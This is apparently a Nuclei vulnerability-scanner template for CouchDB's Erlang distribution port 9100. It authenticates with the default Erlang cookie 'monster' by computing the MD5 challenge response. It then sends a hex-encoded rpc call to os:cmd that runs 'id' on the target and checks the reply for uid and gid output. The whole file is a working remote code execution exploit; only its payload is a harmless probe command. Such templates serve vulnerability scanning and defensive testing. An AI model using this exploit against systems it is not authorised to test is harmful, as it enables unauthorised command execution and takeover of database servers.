id: couch

info:
  name: couch
  author: pussycat0x
  severity: critical
  tags: couch

variables:
  name_msg: "00156e00070003499c4141414141414041414141414141"
  challenge_reply: "00157201020304"
  cookie: "monster"
  cmd: "0000006670836804610667770e41414141414140414141414141410000000300000000007700770372657883680267770e41414141414140414141414141410000000300000000006805770463616c6c77026f737703636d646c000000016b000269646a770475736572"

network:
  - inputs:
      # auth
      - data: "{{name_msg}}"
        type: hex
        read: 1024
      - read: 1024
        name: challenge
      - data: "{{challenge_reply+md5(cookie + to_string(unpack('>I',substr(challenge, 9, 13))))}}"
        type: hex
      # rce
      - data: "{{cmd}}"
        type: hex
        read: 1024
    host:
      - "{{Hostname}}:9100"
    matchers:
      - type: word
        condition: and
        part: raw
        words:
          - "uid"
          - "gid"
          - "groups"
          - "couchdb"